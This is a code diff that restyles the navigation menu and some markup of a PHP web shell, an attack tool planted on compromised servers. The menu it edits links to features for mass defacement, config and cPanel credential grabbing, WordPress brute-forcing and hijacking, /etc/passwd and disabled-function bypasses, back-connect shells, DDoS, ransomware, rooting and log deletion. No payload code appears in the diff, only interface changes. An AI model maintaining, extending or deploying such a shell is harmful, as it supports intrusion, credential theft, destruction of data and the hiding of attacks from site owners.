@@ -397,49 +397,11 @@ $bypassManager->runBypassChecks();
     color: #000;
   }
 
-  /* ===== Navigation menu ===== */
-  #menu a {
-    font-family: var(--font-deco);
-    font-size: var(--fs-base);
-    background: #151515;
-    color: var(--clr-accent);
-    margin: 5px 2px 4px;
-    padding: 5px 8px;
-    border: 1px solid var(--clr-accent);
-    text-decoration: none;
-    letter-spacing: 1px;
-    border-radius: var(--radius-sm);
-    display: inline-block;      /* needed for padding + border to behave */
-    transition: background 0.2s, color 0.2s;
-  }
-  #menu a:hover {
-    background: #000;
-    color: var(--clr-gold-hover);
-    border-color: var(--clr-gold-hover);
-  }
-
-  /* ===== Box component ===== */
-  .mybox {
-    border: 1px solid var(--clr-border);
-    border-radius: var(--radius-md);
-    margin: 4px 0 8px;
-    padding: 14px 8px;
-  }
-
   /* ===== Responsive breakpoints ===== */
   @media (max-width: 768px) {
     textarea {
       height: 280px;
     }
-    #menu a {
-      display: block;
-      text-align: center;
-      margin: 4px 0;
-    }
-    select {
-      width: 100%;
-    }
-  }
 
   @media (max-width: 480px) {
     html {
@@ -900,70 +862,70 @@ ___  ___         ______                 _              _
   echo "<hr color=deepskyblue>";
   echo "<center>";
   echo "<ul>";
-  echo "<div id=menu border=1>";
-  echo "<a style='border:1px groove cyan;' href='?'>Home</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=upload'>Upload</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=command'>Command</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=mass_deface'>Mass Deface</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=xaivhost'>Vhost Config Grabber</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=configv2'>Config Grabber</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=jumping'>Jumping</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=cpcrack'>CPanel Crack</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=smtp'>SMTP Grabber</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=zoneh'>Zone-H</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=base64pict'>Base64 Image Converter</a>";
+  echo "<div class=menu>";
+  echo "<a href='?'>Home</a>";
+  echo "<a href='?dir=$dir&do=upload'>Upload</a>";
+  echo "<a href='?dir=$dir&do=command'>Command</a>";
+  echo "<a href='?dir=$dir&do=mass_deface'>Mass Deface</a>";
+  echo "<a href='?dir=$dir&do=xaivhost'>Vhost Config Grabber</a>";
+  echo "<a href='?dir=$dir&do=configv2'>Config Grabber</a>";
+  echo "<a href='?dir=$dir&do=jumping'>Jumping</a>";
+  echo "<a href='?dir=$dir&do=cpcrack'>CPanel Crack</a>";
+  echo "<a href='?dir=$dir&do=smtp'>SMTP Grabber</a>";
+  echo "<a href='?dir=$dir&do=zoneh'>Zone-H</a>";
+  echo "<a href='?dir=$dir&do=base64pict'>Base64 Image Converter</a>";
   echo "<p>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=spam_mail'>Mail Spammer</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=fake_root'>Fake Root</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=wp_timthumb'>Wp TimThumb Finder</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=auto_wp'>Wp Auto Edit Title</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=auto_dwp'>Wp Auto Deface</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=auto_dwp2'>Wp Auto Deface V.2</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=wpbf'>Wp Bruteforce</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=hijack_wp'>Wp Auto Hijack</a>";
+  echo "<a href='?dir=$dir&do=spam_mail'>Mail Spammer</a>";
+  echo "<a href='?dir=$dir&do=fake_root'>Fake Root</a>";
+  echo "<a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a>";
+  echo "<a href='?dir=$dir&do=wp_timthumb'>Wp TimThumb Finder</a>";
+  echo "<a href='?dir=$dir&do=auto_wp'>Wp Auto Edit Title</a>";
+  echo "<a href='?dir=$dir&do=auto_dwp'>Wp Auto Deface</a>";
+  echo "<a href='?dir=$dir&do=auto_dwp2'>Wp Auto Deface V.2</a>";
+  echo "<a href='?dir=$dir&do=wpbf'>Wp Bruteforce</a>";
+  echo "<a href='?dir=$dir&do=hijack_wp'>Wp Auto Hijack</a>";
   echo "<p>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=endecode'>EN/DEcoder</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=symlink'>Symlink Server</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=symconfv2'>Symlink v2</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=sympy'>Symlink Python</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&bypass=disablefunc'>Disable Functions</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&bypass=vhosts'>Bypass Vhost</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&bypass=etcpass'>Bypass /etc/passwd</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&bypass=cloudfl'>Bypass CloudFlare</a>";
-  echo "<a style='border:1px groove cyan;' href='?weevely'>Weevely</a>";
+  echo "<a href='?dir=$dir&do=endecode'>EN/DEcoder</a>";
+  echo "<a href='?dir=$dir&do=symlink'>Symlink Server</a>";
+  echo "<a href='?dir=$dir&do=symconfv2'>Symlink v2</a>";
+  echo "<a href='?dir=$dir&do=sympy'>Symlink Python</a>";
+  echo "<a href='?dir=$dir&bypass=disablefunc'>Disable Functions</a>";
+  echo "<a href='?dir=$dir&bypass=vhosts'>Bypass Vhost</a>";
+  echo "<a href='?dir=$dir&bypass=etcpass'>Bypass /etc/passwd</a>";
+  echo "<a href='?dir=$dir&bypass=cloudfl'>Bypass CloudFlare</a>";
+  echo "<a href='?weevely'>Weevely</a>";
   echo "<p>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=ddos'>DDoS</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=domains'>Domains Viewer</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=ports'>Port Scanner</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=adminer'>Adminer</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=csrf'>CSRF Online</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=bctools'>Back Connect</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=hashgen'>Hash Generator</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=hashid'>Hash Identification</a>";
+  echo "<a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a>";
+  echo "<a href='?dir=$dir&do=ddos'>DDoS</a>";
+  echo "<a href='?dir=$dir&do=domains'>Domains Viewer</a>";
+  echo "<a href='?dir=$dir&do=ports'>Port Scanner</a>";
+  echo "<a href='?dir=$dir&do=adminer'>Adminer</a>";
+  echo "<a href='?dir=$dir&do=csrf'>CSRF Online</a>";
+  echo "<a href='?dir=$dir&do=bctools'>Back Connect</a>";
+  echo "<a href='?dir=$dir&do=hashgen'>Hash Generator</a>";
+  echo "<a href='?dir=$dir&do=hashid'>Hash Identification</a>";
   echo "<p>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=honey'>Honeypot</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=zip_menu'>Zip Menu</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=infosec'>Server Info</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=phpinfo'>PHP Info</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&whmcs=killer'>WHMCS Killer</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=whmcsdeco'>WHMCS Decoder</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=dbdump'>DB Dump</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=vb_ngindex'>VB Index Changer</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=reverse_ip'>Reverse IP</a>";
+  echo "<a href='?dir=$dir&do=honey'>Honeypot</a>";
+  echo "<a href='?dir=$dir&do=zip_menu'>Zip Menu</a>";
+  echo "<a href='?dir=$dir&do=infosec'>Server Info</a>";
+  echo "<a href='?dir=$dir&do=phpinfo'>PHP Info</a>";
+  echo "<a href='?dir=$dir&whmcs=killer'>WHMCS Killer</a>";
+  echo "<a href='?dir=$dir&do=whmcsdeco'>WHMCS Decoder</a>";
+  echo "<a href='?dir=$dir&do=dbdump'>DB Dump</a>";
+  echo "<a href='?dir=$dir&do=vb_ngindex'>VB Index Changer</a>";
+  echo "<a href='?dir=$dir&do=reverse_ip'>Reverse IP</a>";
   echo "<p>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=loghunter'>Log Hunter</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=cgitelnet'>CGI Telnet</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=kudascan'>Shell Scanner v1.1</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=shellscan'>Shell Scanner</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=drupalex'>Drupal Mass Exploiter</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=delogs'>Delete Logs</a>";
+  echo "<a href='?dir=$dir&do=loghunter'>Log Hunter</a>";
+  echo "<a href='?dir=$dir&do=cgitelnet'>CGI Telnet</a>";
+  echo "<a href='?dir=$dir&do=kudascan'>Shell Scanner v1.1</a>";
+  echo "<a href='?dir=$dir&do=shellscan'>Shell Scanner</a>";
+  echo "<a href='?dir=$dir&do=drupalex'>Drupal Mass Exploiter</a>";
+  echo "<a href='?dir=$dir&do=delogs'>Delete Logs</a>";
   echo "<p>";
   echo "<a style='border:1px groove red;' href='?dir=$dir&do=about'>About</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=ransomware'>Ransomware</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=masschm'>Chmod Mass</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=r00t'>Simple Root</a>";
+  echo "<a href='?dir=$dir&do=ransomware'>Ransomware</a>";
+  echo "<a href='?dir=$dir&do=masschm'>Chmod Mass</a>";
+  echo "<a href='?dir=$dir&do=r00t'>Simple Root</a>";
   echo "<a style='border:1px groove red;' href='?dir=$dir&do=contact'>Contact</a>";
   echo "</div>";
   echo "</ul>";
@@ -1653,12 +1615,9 @@ if ($_POST['make']) {
 } elseif ($_GET['do'] == 'reverse_ip') {
   ?>
               <div class="mybox"><center>
-                <div id="sitelist">
                   <a onClick="window.open('https://hackertarget.com/reverse-ip-lookup/','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="https://hackertarget.com/reverse-ip-lookup/">
-                    <td><font color=lime>> REVERSE IP <</font>
-                    </a>
-                  </td>
-                </div></center>
+                    <font color=lime>> REVERSE IP <</font>
+                </a>
               </div>
               <?php
             } elseif ($_GET['do'] == 'infosec') {
@@ -1668,7 +1627,7 @@ if ($_POST['make']) {
                 if ($v) {
                   echo '<span>' . $n . ': </span>';
                   if (strpos($v, "\n") === false) echo $v . '<br>';
-                  else echo '<pre class="ml1">' . $v . '</pre>';
+                  else echo '<pre>' . $v . '</pre>';
                 }
               }
 
